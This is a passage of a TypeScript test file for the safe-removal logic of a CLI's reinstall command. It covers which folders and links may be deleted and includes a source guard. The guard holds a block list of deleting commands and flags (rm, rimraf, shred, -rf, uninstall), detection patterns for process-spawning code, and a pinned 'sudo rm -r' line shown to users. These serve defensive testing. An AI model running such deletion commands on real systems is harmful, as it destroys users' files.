    const aside = unpack(slot(prefix, ".sessionpipe-AbCd1234"));
    expect(take(aside, posix())).toEqual([aside]);
    expect(fake.gone).toEqual(emptied(aside));
    expect(existsSync(aside)).toBe(false);
    expect(prove(fresh, posix())).toEqual(FOLDER);
    expect(binTarget(bin)).toBe(fresh);
  });

  it("a bin link whose folder is gone is removed by itself", () => {
    const prefix = path.join(tmp, "prefix");
    const bin = link(prefix);
    writeFileSync(path.join(prefix, "bin", "node"), "node");
    expect(take(bin, posix(tmp))).toEqual([bin]);
    expect(fake.gone).toEqual([bin]);
    expect(readdirSync(path.join(prefix, "bin"))).toEqual(["node"]);
  });

  it("where reach is one folder, a copy inside it goes", () => {
    const world = path.join(tmp, "world");
    const dir = unpack(slot(path.join(world, ".local")));
    const real = unpack(slot(path.join(tmp, "real")));
    expect(take(dir, posix(world))).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(existsSync(path.join(real, "dist", "cli.js"))).toBe(true);
  });

  it("a copy in reach whose link lies outside it: the folder goes, the link stays", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    const bin = link(prefix);
    // The reach is the prefix's lib: the copy is inside it, <prefix>/bin is not.
    const o = posix(path.join(prefix, "lib"));
    expect(binsOf(dir, o)).toEqual([]);
    expect(binsOf(dir, posix(prefix))).toEqual([bin]);
    expect(take(dir, o)).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(lstatSync(bin).isSymbolicLink()).toBe(true);
  });

  it("a link to it that is really outside the reach, in a bin folder that is a link out of it: the link stays", () => {
    const world = path.join(tmp, "world");
    const prefix = path.join(world, ".local");
    const dir = unpack(slot(prefix));
    // The world's bin folder is another name for one outside it, and the link there
    // leads, by its full name, to the world's copy.
    const outside = path.join(tmp, "outside");
    const theirs = link(outside, path.join(dir, "dist", "cli.js"));
    symlinkSync(path.join(outside, "bin"), path.join(prefix, "bin"));
    const byName = path.join(prefix, "bin", "sessionpipe");
    expect(binTarget(byName)).toBe(dir);
    expect(binsOf(dir, posix(tmp))).toEqual([byName]);
    expect(binsOf(dir, posix(world))).toEqual([]);
    expect(take(dir, posix(world))).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(lstatSync(theirs).isSymbolicLink()).toBe(true);
  });

  it("the path is taken by its one spelling: a slash after it, or a way round, is the same folder", () => {
    const a = unpack(slot(path.join(tmp, "a")));
    const round = [path.dirname(a), "x", "..", "sessionpipe"].join(path.sep);
    expect(prove(a + path.sep, posix())).toEqual(FOLDER);
    expect(prove(round, posix())).toEqual(FOLDER);
    // What it answers, and what it hands to the deletion, is the path written out.
    expect(remove(a + path.sep, posix(tmp))).toEqual([a]);
    expect(fake.gone).toEqual(emptied(a));
    const b = unpack(slot(path.join(tmp, "b")));
    fake.gone = [];
    expect(remove([path.dirname(b), "x", "..", "sessionpipe"].join(path.sep), posix(tmp))).toEqual([b]);
    expect(fake.gone).toEqual(emptied(b));
    // And a way round that leaves the reach is outside it.
    const c = unpack(slot(path.join(tmp, "c")));
    const out = [tmp, "world", "..", "c", "lib", "node_modules", "sessionpipe"].join(path.sep);
    expect(() => remove(out, posix(path.join(tmp, "world")))).toThrow(
      `${c} was left alone: it is outside the folders this sessionpipe keeps its own files in`,
    );
    expect(fake.gone).toEqual(emptied(b));
  });

  it("the link `relink` makes is npm's own: it is its copy's, and goes with it", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    mkdirSync(path.join(prefix, "bin"));
    const file = path.join(prefix, "bin", "sessionpipe");
    // As cli.ts makes it: the same words, in the prefix's bin folder.
    symlinkSync(path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js"), file);
    expect(binTarget(file)).toBe(dir);
    expect(binsOf(dir, posix())).toEqual([file]);
    expect(take(dir, posix())).toEqual([dir, file]);
  });
});

disk("remove: a removal that stops half-way is said, and the next run takes what is left", () => {
  const PART = (dir: string) =>
    new RegExp(
      `^${dir.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} could only be removed in part \\(.+\\): what is left of it no longer runs, and the next run takes it$`,
      "s",
    );

  it.skipIf(root)(
    "L6: a folder inside the copy that can't be emptied: a plain error that says so, package.json and the link still there, and the proof still holds",
    () => {
      const prefix = path.join(tmp, "prefix");
      const dir = unpack(slot(prefix));
      const bin = link(prefix);
      // What a scanner or another user's file does: an entry in dist nobody may take out.
      const locked = path.join(dir, "dist", "chunks");
      mkdirSync(locked);
      writeFileSync(path.join(locked, "a.js"), "a");
      chmodSync(locked, 0o555);
      try {
        const e = thrownBy(() => take(dir, posix())) as Error;
        expect(e).toBeInstanceOf(Error);
        expect(e).not.toBeInstanceOf(NotOurs);
        expect(e.message).toMatch(PART(dir));
        expect(e.message).toContain("could only be removed in part");
        expect(e.message).toContain("the next run takes it");
        // It stopped at the first entry it could not take: nothing after it was handed
        // to a deletion, the manifest least of all, and the link not at all.
        expect(fake.gone).toEqual([path.join(dir, "dist")]);
        expect(readFileSync(path.join(dir, "package.json"), "utf8")).toBe(PACKAGE);
        expect(readFileSync(path.join(locked, "a.js"), "utf8")).toBe("a");
        expect(readlinkSync(bin)).toBe(INTO);
        // So it is still provably ours, and still has its link: a second run finds it.
        expect(prove(dir, posix())).toEqual(FOLDER);
        expect(binsOf(dir, posix())).toEqual([bin]);
        expect(prove(bin, posix())).toEqual({ is: "not", why: "it is the link of a copy that is there" });
      } finally {
        chmodSync(locked, 0o755);
      }
      // The obstacle gone, the same call takes all of it, with its link.
      fake.gone = [];
      expect(take(dir, posix())).toEqual([dir, bin]);
      expect(fake.gone).toEqual([...emptied(dir), bin]);
      expect(existsSync(dir)).toBe(false);
      expect(readdirSync(path.join(prefix, "bin"))).toEqual([]);
    },
  );

  it("L6: wherever it stops, package.json is the last entry to go, the link stays, and the same call finishes the job", () => {
    for (const [n, stuck] of (["dist", "README.md", "LICENSE", "NOTICE", "package.json"] as const).entries()) {
      const prefix = path.join(tmp, `prefix${n}`);
      const dir = unpack(slot(prefix));
      const bin = link(prefix);
      fake.gone = [];
      fake.fails = (call, p) => call === "rmSync" && p === path.join(dir, stuck);
      const e = thrownBy(() => take(dir, posix())) as Error;
      expect(e, stuck).toBeInstanceOf(Error);
      expect(e).not.toBeInstanceOf(NotOurs);
      expect(e.message).toBe(
        `${dir} could only be removed in part (EACCES: permission denied, rmSync '${path.join(dir, stuck)}'): what is left of it no longer runs, and the next run takes it`,
      );
      // Every entry before the one that stuck is gone; that one and all after it are there.
      expect(fake.gone, stuck).toEqual(emptied(dir).slice(0, n + 1));
      expect(readdirSync(dir).sort(), stuck).toEqual(
        FIVE.filter((f) => !emptied(dir).slice(0, n).includes(path.join(dir, f))),
      );
      expect(readFileSync(path.join(dir, "package.json"), "utf8")).toBe(PACKAGE);
      expect(readlinkSync(bin)).toBe(INTO);
      // Still a published sessionpipe by the proof, so the run that comes back takes it.
      expect(prove(dir, posix()), stuck).toEqual(FOLDER);
      fake.fails = null;
      fake.gone = [];
      expect(take(dir, posix()), stuck).toEqual([dir, bin]);
      expect(existsSync(dir)).toBe(false);
      expect(readdirSync(path.join(prefix, "bin"))).toEqual([]);
    }
  });

  it("L6: the emptied folder that won't go is said the same way, and its link is not taken from it", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    const bin = link(prefix);
    fake.fails = (call, p) => call === "rmdirSync" && p === dir;
    const e = thrownBy(() => take(dir, posix())) as Error;
    expect(e).not.toBeInstanceOf(NotOurs);
    expect(e.message).toMatch(PART(dir));
    expect(fake.gone).toEqual(emptied(dir));
    expect(existsSync(dir)).toBe(true);
    expect(readlinkSync(bin)).toBe(INTO);
    // The folder is empty by then (package.json is the last entry to go, and it went
    // before the folder was known to). "The next run takes it" was said of a folder the
    // next run refused: with no package.json it was no longer provably ours, and its link,
    // which leads to a folder that is there, does not go alone either. An empty folder of
    // the name in a slot is ours now, so the sentence holds: the same call takes it.
    fake.fails = null;
    fake.gone = [];
    expect(readdirSync(dir)).toEqual([]);
    expect(prove(dir, posix())).toEqual(FOLDER);
    expect(binsOf(dir, posix())).toEqual([bin]);
    expect(take(dir, posix())).toEqual([dir, bin]);
    expect(fake.gone).toEqual([...emptied(dir), bin]);
    expect(existsSync(dir)).toBe(false);
    expect(readdirSync(path.join(prefix, "bin"))).toEqual([]);
  });

  it("L6: a folder npm installed into that can't be taken whole is said the same way", () => {
    const prefix = path.join(tmp, "prefix");
    const stage = slot(prefix, ".sessionpipe-AbCd1234");
    unpack(slot(stage));
    fake.fails = (call, p) => call === "rmSync" && p === stage;
    const e = thrownBy(() => take(stage, posix())) as Error;
    expect(e).not.toBeInstanceOf(NotOurs);
    expect(e.message).toMatch(PART(stage));
    expect(fake.gone).toEqual([stage]);
    // Nothing of it went, and it is what it was.
    expect(prove(stage, posix())).toEqual({ ...FOLDER, aside: true, staging: true });
    fake.fails = null;
    fake.gone = [];
    expect(take(stage, posix())).toEqual([stage]);
    expect(existsSync(stage)).toBe(false);
  });
});

disk("the folder this command has npm install into, beside the slot", () => {
  const STAGING = { is: "folder", slot: "global", aside: true, staging: true };
  /** A prefix of its own for one package, as npm lays one out: the copy, npm's own list
   *  beside it, and the link in its bin. */
  function staged(prefix: string, id = "AbCd1234"): string {
    const dir = slot(prefix, `.sessionpipe-${id}`);
    unpack(slot(dir));
    writeFileSync(path.join(dir, "lib", "node_modules", ".package-lock.json"), '{"lockfileVersion":3}');
    link(dir);
    return dir;
  }

  it("L1: it is known by its shape in every state the swap leaves it, and goes whole by one removal", () => {
    const prefix = path.join(tmp, "prefix");
    // The copy this run has put in the slot, and its link: neither is the folder's.
    const fresh = unpack(slot(prefix));
    const bin = link(prefix);
    const states: Record<string, (dir: string) => void> = {
      "as npm left it: the copy still inside (the install failed, or the run was cut off)": () => {},
      "the copy moved out into the slot": (dir) => renameSync(slot(dir), path.join(tmp, `moved-${path.basename(dir)}`)),
      "npm's list gone too": (dir) => {
        fake.real.rmSync(slot(dir), { recursive: true });
        fake.real.unlinkSync(path.join(dir, "lib", "node_modules", ".package-lock.json"));
      },
      "its node_modules gone": (dir) => fake.real.rmSync(path.join(dir, "lib", "node_modules"), { recursive: true }),
      "an empty lib": (dir) => {
        fake.real.rmSync(path.join(dir, "lib"), { recursive: true });
        mkdirSync(path.join(dir, "lib"));
      },
      "no lib": (dir) => fake.real.rmSync(path.join(dir, "lib"), { recursive: true }),
      "no link in its bin": (dir) => fake.real.unlinkSync(path.join(dir, "bin", "sessionpipe")),
      "no bin": (dir) => fake.real.rmSync(path.join(dir, "bin"), { recursive: true }),
      "nothing in it at all": (dir) => {
        fake.real.rmSync(path.join(dir, "lib"), { recursive: true });
        fake.real.rmSync(path.join(dir, "bin"), { recursive: true });
      },
    };
    let n = 0;
    for (const [state, make] of Object.entries(states)) {
      const dir = staged(prefix, `AbCd000${n++}`);
      make(dir);
      expect(prove(dir, posix()), state).toEqual(STAGING);
      // No link is its own: the one in the prefix's bin is the fresh copy's.
      expect(binsOf(dir, posix()), state).toEqual([]);
      const before = tree();
      fake.gone = [];
      expect(take(dir, posix()), state).toEqual([dir]);
      expect(fake.gone, state).toEqual([dir]);
      expect(tree(), state).toEqual(without(before, dir));
    }
    expect(prove(fresh, posix())).toEqual(FOLDER);
    expect(binsOf(fresh, posix())).toEqual([bin]);
    expect(readdirSync(path.dirname(fresh))).toEqual(["sessionpipe"]);
  });

  it("L2: it goes whatever npm unpacked in the copy: a release this version doesn't know the files of, a dependency of its own", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = staged(prefix);
    // What a later release with a wider `files`, or with a dependency, is to this one.
    writeFileSync(path.join(slot(dir), "CHANGELOG.md"), "new in this release");
    mkdirSync(path.join(slot(dir), "node_modules", "dep"), { recursive: true });
    writeFileSync(path.join(slot(dir), "node_modules", "dep", "index.js"), "dep");
    fake.real.unlinkSync(path.join(slot(dir), "package.json"));
    expect(prove(dir, posix())).toEqual(STAGING);
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual([dir]);
    expect(existsSync(dir)).toBe(false);
    // The same copy anywhere else is no published sessionpipe to this version: only the
    // folder this command made is taken whatever it holds.
    const elsewhere = unpack(slot(path.join(tmp, "a")));
    writeFileSync(path.join(elsewhere, "CHANGELOG.md"), "new in this release");
    fake.gone = [];
    refused(elsewhere, posix(), "it holds CHANGELOG.md, which no published sessionpipe has (a checkout or a build?)");
  });

  it("L1: nothing is removed through it: a link in it is taken as a link, and what it leads to stays", () => {
    const prefix = path.join(tmp, "prefix");
    const home = unpack(slot(prefix));
    const dir = staged(prefix);
    // Its bin link leads, by its full name, to the copy in the slot.
    fake.real.unlinkSync(path.join(dir, "bin", "sessionpipe"));
    symlinkSync(path.join(home, "dist", "cli.js"), path.join(dir, "bin", "sessionpipe"));
    // npm's list is a link to a file of someone's.
    const theirs = path.join(tmp, "theirs.json");
    writeFileSync(theirs, "theirs");
    fake.real.unlinkSync(path.join(dir, "lib", "node_modules", ".package-lock.json"));
    symlinkSync(theirs, path.join(dir, "lib", "node_modules", ".package-lock.json"));
    expect(prove(dir, posix())).toEqual(STAGING);
    expect(take(dir, posix())).toEqual([dir]);
    expect(readFileSync(theirs, "utf8")).toBe("theirs");
    expect(readdirSync(home).sort()).toEqual(FIVE);
  });

  it("L1: anything else in it and it is no such folder: it is judged as any leftover, and stays", () => {
    const prefix = path.join(tmp, "prefix");
    const others: Record<string, (dir: string) => void> = {
      "a third entry at its top": (dir) => mkdirSync(path.join(dir, "share")),
      "a file at its top": (dir) => writeFileSync(path.join(dir, "notes.txt"), "mine"),
      "a second package beside the copy": (dir) => mkdirSync(path.join(dir, "lib", "node_modules", "other")),
      "a second folder in its lib": (dir) => mkdirSync(path.join(dir, "lib", "python3")),
      "a second command in its bin": (dir) => writeFileSync(path.join(dir, "bin", "other"), "#!/bin/sh\n"),
      "a plain file where its link is": (dir) => {
        fake.real.unlinkSync(path.join(dir, "bin", "sessionpipe"));
        writeFileSync(path.join(dir, "bin", "sessionpipe"), "#!/bin/sh\necho mine\n");
      },
      "a link there that leads to another program": (dir) => {
        fake.real.unlinkSync(path.join(dir, "bin", "sessionpipe"));
        symlinkSync("/usr/bin/true", path.join(dir, "bin", "sessionpipe"));
      },
      "a lib that is a link to a folder somewhere else": (dir) => {
        renameSync(path.join(dir, "lib"), path.join(tmp, `lib-of-${path.basename(dir)}`));
        symlinkSync(path.join(tmp, `lib-of-${path.basename(dir)}`), path.join(dir, "lib"));
      },
      "a bin that is a link to a folder somewhere else": (dir) => {
        renameSync(path.join(dir, "bin"), path.join(tmp, `bin-of-${path.basename(dir)}`));
        symlinkSync(path.join(tmp, `bin-of-${path.basename(dir)}`), path.join(dir, "bin"));
      },
      "a node_modules that is a link": (dir) => {
        renameSync(path.join(dir, "lib", "node_modules"), path.join(tmp, `modules-of-${path.basename(dir)}`));
        symlinkSync(path.join(tmp, `modules-of-${path.basename(dir)}`), path.join(dir, "lib", "node_modules"));
      },
      "a copy that is a link to a folder somewhere else": (dir) => {
        renameSync(slot(dir), path.join(tmp, `copy-of-${path.basename(dir)}`));
        symlinkSync(path.join(tmp, `copy-of-${path.basename(dir)}`), slot(dir));
      },
      "a file where the copy is": (dir) => {
        fake.real.rmSync(slot(dir), { recursive: true });
        writeFileSync(slot(dir), "a file");
      },
      "a file where its lib is": (dir) => {
        fake.real.rmSync(path.join(dir, "lib"), { recursive: true });
        writeFileSync(path.join(dir, "lib"), "a file");
      },
    };
    let n = 0;
    for (const [what, make] of Object.entries(others)) {
      const dir = staged(prefix, `AbCd00${String(n++).padStart(2, "0")}`);
      make(dir);
      fake.gone = [];
      // As a leftover it holds what no published sessionpipe has: its own lib or bin.
      const before = tree();
      const proof = prove(dir, posix());
      expect(proof.is, what).toBe("not");
      expect((proof as { why: string }).why, what).toMatch(HOLDS);
      expect(
        thrownBy(() => remove(dir, posix())),
        what,
      ).toBeInstanceOf(NotOurs);
      expect(fake.gone, what).toEqual([]);
      expect(tree(), what).toEqual(before);
    }
  });

  it("L1: only in a global slot, in reach, and never where it is the copy that is kept", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = staged(prefix);
    refused(dir, posix(null), OUTSIDE);
    refused(dir, posix(path.join(tmp, "world")), OUTSIDE);
    refused(dir, posix(true, { prefixes: [] }), NO_SLOT);
    refused(dir, posix(true, { keep: [dir] }), KEPT);
    // In an npx cache entry no folder is npm's to install into.
    const entry = path.join(path.dirname(npx()), ".sessionpipe-AbCd1234");
    mkdirSync(path.join(entry, "lib"), { recursive: true });
    refused(entry, posix(), NO_SLOT);
    // In a project's node_modules that has the look of a prefix's.
    const app = path.join(tmp, "work", "app");
    const theirs = staged(app);
    writeFileSync(path.join(app, "lib", "package.json"), "{}");
    refused(theirs, posix(true, { prefixes: [app] }), PROJECT);
    expect(prove(dir, posix())).toEqual(STAGING);
  });
});

describe("the guard: one file deletes, in one function, and nothing is npm's or a shell's to delete", () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const src = path.resolve(here, "..", "src");
  const coreSrc = path.resolve(here, "..", "..", "core", "src");
  /** A source file's text, with the line ends of any checkout read as one kind. */
  const texts = new Map<string, string>();
  const read = (file: string): string => {
    if (!texts.has(file)) texts.set(file, readFileSync(file, "utf8").replace(/\r\n?/g, "\n"));
    return texts.get(file) as string;
  };
  const folder = path.join(src, "reinstall");
  const files = readdirSync(folder).sort();
  const source = (name: string): string => read(path.join(folder, name));
  const CLI = read(path.join(src, "cli.ts"));

  /** Source is quoted below in plain strings, where a `$` before a brace would read as a
   *  slip of the hand: `@{` stands for it. */
  const q = (s: string): string => s.replaceAll("@{", "$".concat("{"));

  /** A text without the comments that have lines to themselves: a sentence may name what
   *  the code must not do. (A comment after code on its line stays: it is read as code.) */
  const code = (text: string): string =>
    text.replace(/^[ \t]*\/\*[\s\S]*?\*\/[ \t]*$/gm, "").replace(/^[ \t]*\/\/.*$/gm, "");

  /** Every way node:fs deletes, by its name or as it is called. */
  const DELETES = /\b(?:rmSync|unlinkSync|rmdirSync)\b|\b(?:rm|unlink|rmdir)\(/g;
  const deletes = (text: string): { at: number; word: string }[] =>
    [...text.matchAll(DELETES)].map((m) => ({ at: m.index, word: m[0] }));

  /** A call that starts a program, by the names this package and node have for one (a
   *  method of some object, `re.exec(…)`, is not one). */
  const RUNNER = /(?<![.\w$])(?:execCapture|npmDo|spawn\w*|exec\w*|fork)\s*\(/g;
  /** Every such call with all it is handed: the text up to the bracket that closes it. */
  const runs = (text: string): string[] =>
    [...text.matchAll(RUNNER)].map((m) => {
      let depth = 0;
      for (let i = m.index + m[0].length - 1; i < text.length; i++) {
        if (text[i] === "(") depth++;
        else if (text[i] === ")" && --depth === 0) return text.slice(m.index, i + 1);
      }
      return text.slice(m.index);
    });
  /** A program that deletes, or the word that tells npm (or a shell) to. */
  const TAKERS = new Set([
    ...["rm", "rmdir", "unlink", "del", "erase", "rd", "rimraf", "shred", "trash"],
    ...["uninstall", "un", "remove", "r", "prune", "-rf", "-fr", "-r", "-R"],
  ]);
  const QUOTED = /"((?:[^"\\\n]|\\.)*)"|'((?:[^'\\\n]|\\.)*)'|`((?:[^`\\]|\\.)*)`/g;
  /** The calls that start a program and hand it such a word, as a word of an argv or in
   *  a line for a shell. */
  const argvDeletes = (text: string): string[] =>
    runs(text).filter((call) =>
      [...call.matchAll(QUOTED)].some((q) => (q[1] ?? q[2] ?? q[3] ?? "").split(/\s+/).some((w) => TAKERS.has(w))),
    );
  const squash = (s: string): string => s.replace(/\s+/g, " ");

  /** What a file takes from node:fs, name by name; `*` for the module whole. */
  const fromFs = (text: string): string[] =>
    [...text.matchAll(/import\s*(?:\{([^}]*)\}|[^;{]*?)\s*from\s*"(?:node:)?fs(?:\/promises)?";/g)].flatMap((m) =>
      (m[1] ?? "*")
        .split(",")
        .map((s) => s.trim())
        .filter(Boolean),
    );
  const READS = [
    "accessSync",
    "constants",
    "existsSync",
    "lstatSync",
    "readdirSync",
    "readFileSync",
    "readlinkSync",
    "realpathSync",
    "statSync",
  ];
  const OURS_ONLY = ["rmdirSync", "rmSync", "unlinkSync"];

  /** Every name a file can use from another module, and the module it is from. */
  const imported = (text: string): Map<string, string> => {
    const all = new Map<string, string>();
    for (const m of text.matchAll(/^import\s+(type\s+)?([^;]*?)\s+from\s+"([^"]+)";$/gm)) {
      if (m[1]) continue;
      const what = m[2] as string;
      const from = m[3] as string;
      for (const part of (/\{([\s\S]*)\}/.exec(what)?.[1] ?? "").split(","))
        if (part.trim() && !part.trim().startsWith("type "))
          all.set(
            part
              .trim()
              .split(/\s+as\s+/)
              .pop() as string,
            from,
          );
      for (const rest of what.replace(/\{[\s\S]*\}/, "").split(","))
        if (rest.trim()) all.set(rest.trim().replace(/^\*\s+as\s+/, ""), from);
    }
    return all;
  };

  /** A declaration at the top of a file, whole: from its first line to the line that
   *  closes it. Biome sets every one at the margin and all that is inside it in from the
   *  margin, so it ends at the first line back at the margin that closes a bracket and
   *  opens none (or, with no such line, where the lines stop being set in). Null: the
   *  file declares nothing of the name. */
  const statement = (text: string, name: string): string | null => {
    const n = name.replace(/\$/g, "\\$");
    const m = new RegExp(
      `^(?:export\\s+)?(?:(?:async\\s+)?function\\*?\\s+${n}\\b|(?:const|let|var|class)\\s+${n}\\b)`,
      "m",
    ).exec(text);
    if (!m) return null;
    const lines = text.slice(m.index).split("\n");
    const setIn = (i: number): boolean => /^\s+\S/.test(lines[i] ?? "");
    let i = 1;
    for (;;) {
      while (i < lines.length && (setIn(i) || (lines[i] === "" && setIn(i + 1)))) i++;
      if (!/^[})\]]/.test(lines[i] ?? "")) break;
      i++;
      if (!/(?:[{([,]|=>)\s*$/.test(lines[i - 1] as string)) break;
    }
    return lines.slice(0, i).join("\n");
  };

  /** Every .ts file under a folder. */
  const under = (dir: string): string[] =>
    readdirSync(dir, { withFileTypes: true }).flatMap((e) =>
      e.isDirectory() ? under(path.join(dir, e.name)) : e.name.endsWith(".ts") ? [path.join(dir, e.name)] : [],
    );
  /** The files a name cli.ts imports may be declared in: the module of this package it
   *  names, any file of core; none for node's own. */
  const modules = (from: string): string[] =>
    from.startsWith("./")
      ? [path.join(src, ...from.slice(2).replace(/\.js$/, ".ts").split("/"))]
      : from.startsWith("@sessionpipe/core")
        ? under(coreSrc)
        : [];

  /** The body of `reinstall()` in a cli.ts of this text; null where it is not found. */
  const reinstallOf = (cli: string): string | null => {
    const start = cli.indexOf("\nasync function reinstall(): Promise<void> {\n");
    const end = cli.indexOf("\n}\n", start);
    return start < 0 || end < 0 ? null : cli.slice(start + 1, end + 2);
  };

  /** A word that is a command that deletes, where it is not the name of a call. */
  const COMMAND = /(?<![\w$.-])(?:rm|rmdir|unlink|del|rimraf)(?![\w$(-])/g;
  /** The line plan.ts prints for a person to paste where they may not write: it is shown,
   *  never run (plan.ts runs nothing: see `inModule`). */
  const SUDO_LINE = q('line: `sudo rm -r @{[c.dir, ...c.bins].map((x) => shq(x, "linux")).join(" ")}`,');
  /** Volta's own command for its own copy, shown to a person the same way. */
  const VOLTA_LINE = 'keeper: kept ? "volta uninstall sessionpipe" : null,';

  /** A bracket after a name or a closing bracket: a member by a computed name, an item of
   *  a list, an array type; and what is between the brackets. */
  const COMPUTED = /([A-Za-z_$][\w$]*|[)\]])\s*(?:\?\.\s*)?\[([^\]\n]*)\]/g;
  /** The tables page.ts looks a word up in, and the types a field is read from by name. */
  const TABLES = ["USED", "KIND", "VERB"];
  const TYPES = ["Inventory", "Facts", "Plan"];
  const WORDS = ["const", "let", "var", "return", "of", "in", "as", "case", "yield", "await", "typeof", "else"];
  /** What is wrong with a computed access; null for one of the kinds these files use. */
  const computedWrong = (receiver: string, key: string): string | null => {
    const said = `${receiver}[${key}]`;
    // A list written out after a word of the language is no member of anything.
    if (WORDS.includes(receiver)) return null;
    if (receiver === "fs") return `${said}: a member of fs by a name made at run time`;
    // An array type, an item by its number, the one character class the patterns here use.
    if (key === "" || /^\d+$/.test(key) || key === "\\\\/") return null;
    if (/^"[A-Za-z]+"$/.test(key)) return TYPES.includes(receiver) ? null : `${said}: a member by a name in a string`;
    if (/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*$/.test(key))
      return TABLES.includes(receiver) ? null : `${said}: a member by a name held in a variable`;
    return `${said}: a member by a name made at run time`;
  };

  /** What is wrong with one of reinstall/*.ts, a sentence each; none for a file that
   *  keeps the rule. */
  function inModule(name: string, text: string): string[] {
    const wrong: string[] = [];
    const bare = code(text);
    const ours = name === "ours.ts";
    if (!ours) for (const d of deletes(text)) wrong.push(`names a deletion: ${d.word}`);
    // What it takes from node:fs is read-only, name by name (never the whole module).
    for (const taken of fromFs(text))
      if (![...READS, ...(ours ? OURS_ONLY : [])].includes(taken)) wrong.push(`takes ${taken} from node:fs`);
    if (/fs\/promises/.test(text)) wrong.push("takes fs/promises");
    if (/child_process/.test(text)) wrong.push("takes child_process");
    if (/\brequire\s*\(|\bimport\s*\(/.test(text)) wrong.push("loads a module by a call");
    if (/\b(?:rename|write|append|truncate|copy|cp|mkdir|symlink|link|chmod)\w*Sync\b/.test(text))
      wrong.push("writes with node:fs");
    for (const call of runs(bare)) wrong.push(`starts a program: ${squash(call).slice(0, 80)}`);
    if (/\bprocess\b|\bglobalThis\b|\beval\s*\(|\bFunction\s*\(/.test(bare))
      wrong.push("reaches for process, globalThis or code made at run time");
    // npm is never asked to remove anything, and no line for a shell is run. The two
    // lines that are shown to a person are the only words of the kind, and are pinned.
    const shown = bare.replace(name === "find.ts" ? VOLTA_LINE : name === "plan.ts" ? SUDO_LINE : "\u0000", "");
    if (/uninstall/i.test(shown)) wrong.push("says uninstall");
    for (const w of shown.match(COMMAND) ?? []) wrong.push(`names a command that deletes: ${w}`);
    // No member of anything by a name that is made or held, least of all of node:fs.
    const noImports = bare.replace(/^import\s[^;]*;$/gm, "");
    if (/\bfs\b/.test(noImports)) wrong.push("names fs itself");
    for (const m of noImports.matchAll(COMPUTED)) {
      const why = computedWrong(m[1] as string, m[2] as string);
      if (why) wrong.push(why);
    }
    return wrong;
  }

  /** What `reinstall()` hands to a program itself: npm is asked where its global folder
   *  is, and to fetch the release into its cache. Nothing else, in these very words. */
  const STARTS = [
    'execCapture([...npmArgv(node), "prefix", "-g"], { env: process.env, timeoutMs: 20_000 })',
    q('npmDo(["cache", "add", `sessionpipe@@{v}`], { node })'),
  ];
  /** What it uses of `process`. */
  const PROCESS = ["env", "execPath", "exitCode", "kill", "platform", "stdin", "stdout"];
  /** What it writes with node:fs: the two renames of the swap, and npm's own link (with
   *  the folder it is in) made where it is not there. */
  const WRITES = ["renameSync", "mkdirSync", "symlinkSync"];

  /** What is wrong with `reinstall()` in a cli.ts of this text, and with what is one call
   *  away from it; none for one that keeps the rule. */
  function inCli(cli: string): string[] {
    const body = reinstallOf(cli);
    if (body === null) return ["reinstall() is not where this guard looks for it"];
    const wrong: string[] = [];
    const bare = code(body);
    for (const d of deletes(body)) wrong.push(`names a deletion: ${d.word}`);
    if (/uninstall/i.test(bare)) wrong.push("says uninstall");
    for (const w of bare.match(COMMAND) ?? []) wrong.push(`names a command that deletes: ${w}`);
    for (const call of runs(bare).map(squash))
      if (!STARTS.includes(call)) wrong.push(`starts a program with words this guard was not shown: ${call}`);
    for (const m of bare.matchAll(/\bprocess\b\s*(?:(?:\?\.|\.)\s*([A-Za-z_$][\w$]*))?/g))
      if (!m[1] || !PROCESS.includes(m[1]))
        wrong.push(`reaches for process${m[1] ? `.${m[1]}` : " by a computed name"}`);
    for (const m of bare.matchAll(/\bimport\s*\(([^)]*)\)/g))
      if (m[1] !== '"node:readline/promises"') wrong.push(`loads ${m[1]} by a call`);
    if (/\brequire\s*\(|\bglobalThis\b|\beval\s*\(|\bFunction\s*\(/.test(bare))
      wrong.push("reaches for a module or for code made at run time");
    if (/\bfs\b/.test(bare)) wrong.push("names fs itself");
    // A member by a name that is quoted or joined; a field of a type read by its name
    // is none. (By a name held in a variable cli.ts reads its own tables: see below.)
    for (const m of bare.matchAll(COMPUTED)) {
      const why = /["'`+]/.test(m[2] as string) ? computedWrong(m[1] as string, m[2] as string) : null;
      if (why) wrong.push(why);
    }
    const syncs = (bare.match(/\b\w+Sync\b/g) ?? []).filter((w) => !["existsSync", "readFileSync"].includes(w));
    if (syncs.join(" ") !== WRITES.join(" ")) wrong.push(`uses of node:fs that write: ${syncs.join(" ")}`);
    if (/\b(?:writeFile|appendFile|truncate|copyFile|cp|mkdir|mkdtemp|symlink|link|chmod|rename)\(/.test(bare))
      wrong.push("writes by a name this guard was not shown");
    // One call away. Every name in its text (a word of a sentence too: more is looked at,
    // never less) that cli.ts declares at its top, or takes from a module of this package
    // or of core: the declaration is read, and it may not delete. The one exception is
    // the removal itself, ours.ts's.
    const takes = imported(cli);
    for (const word of [...new Set(bare.match(/(?<![.\w$])[A-Za-z_$][\w$]*/g))].sort()) {
      if (word === "reinstall") continue;
      const from = takes.get(word);
      if (word === "remove" && from === "./reinstall/ours.js") continue;
      const own = statement(cli, word);
      const declared =
        own !== null
          ? [own]
          : modules(from ?? "").flatMap((file) => {
              const s = statement(read(file), word);
              return s === null ? [] : [s];
            });
      for (const text of declared) {
        const found = [...deletes(text).map((d) => d.word), ...argvDeletes(code(text)).map(squash)];
        if (found.length) wrong.push(`uses ${word}, which deletes: ${found[0]}`);
        else if (/uninstall/i.test(code(text))) wrong.push(`uses ${word}, which says uninstall`);
      }
    }
    return wrong;
  }

  /** The source with one line put in before another: a mutant of it. */
  const before = (text: string, anchor: string, line: string): string => {
    expect(text.split(anchor), `${anchor} is there once`).toHaveLength(2);
    return text.replace(anchor, () => `${line}\n${anchor}`);
  };
